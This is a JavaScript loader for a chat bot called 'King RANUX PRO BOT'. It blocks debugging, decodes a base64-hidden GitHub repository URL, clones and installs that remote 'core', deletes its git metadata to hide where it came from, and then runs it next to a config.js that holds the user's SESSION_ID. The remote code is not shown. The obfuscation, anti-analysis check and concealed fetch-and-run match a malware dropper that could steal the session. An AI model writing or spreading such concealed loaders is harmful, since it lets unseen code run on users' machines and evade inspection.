const { execSync } = require("child_process");
const fs = require("fs");
const path = require("path");

// Anti debug
if (process.execArgv.join("").includes("inspect")) {
  console.log("❌ Debug mode detected. Exiting...");
  process.exit(1);
}

// Decode core url (double encoded base64)
const CORE_URL = Buffer.from(
  "aHR0cHM6Ly9naXRodWIuY29tL3J4YnJpZGdlLWRldi9ueC1icmlkZ2UuZ2l0",
  "base64"
).toString("utf-8");

const CORE_DIR = path.join(__dirname, "core");

function log(msg) {
  console.log(msg);
}

log("");
log("👑 KING RANUX PRO BOT");
log("━━━━━━━━━━━━━━━━━━━━━━");
log("🔐 Secure Core Loader");
log("");

// Clear npm cache
try {
  log("🧹 Clearing npm cache...");
  execSync("npm cache clean --force", { stdio: "ignore" });
} catch {}

// Remove old core
if (fs.existsSync(CORE_DIR)) {
  try {
    log("♻️ Old core found. Removing...");
    fs.rmSync(CORE_DIR, { recursive: true, force: true });
    log("✅ Old core removed.");
  } catch {
    log("⚠️ Failed to remove old core.");
  }
}

// Download core
log("📥 Downloading latest King RANUX PRO core...");
try {
  execSync(`git clone ${CORE_URL} core`, { stdio: "ignore" });
  log("✅ Core downloaded successfully.");
} catch (e) {
  log("❌ Failed to download core.");
  process.exit(1);
}

// Remove git metadata
if (fs.existsSync(path.join(CORE_DIR, ".git"))) {
  try {
    fs.rmSync(path.join(CORE_DIR, ".git"), { recursive: true, force: true });
    log("🕵️ Core origin hidden.");
  } catch {}
}

// Install dependencies
if (!fs.existsSync(path.join(CORE_DIR, "node_modules"))) {
  try {
    log("📦 Installing core dependencies...");
    execSync("cd core && npm install", { stdio: "ignore" });
    log("✅ Dependencies installed.");
  } catch {
    log("❌ Failed to install dependencies.");
    process.exit(1);
  }
}

// Check user config
const userConfigPath = path.join(__dirname, "config.js");

if (!fs.existsSync(userConfigPath)) {
  log("❌ config.js not found!");
  log("👉 Please create config.js with your SESSION_ID.");
  process.exit(1);
}

log("");
log("🚀 Launching King RANUX PRO...");
log("━━━━━━━━━━━━━━━━━━━━━━");

try {
  require("./core/index.js");
} catch (e) {
  log("❌ Failed to start core.");
  console.log(e);
}
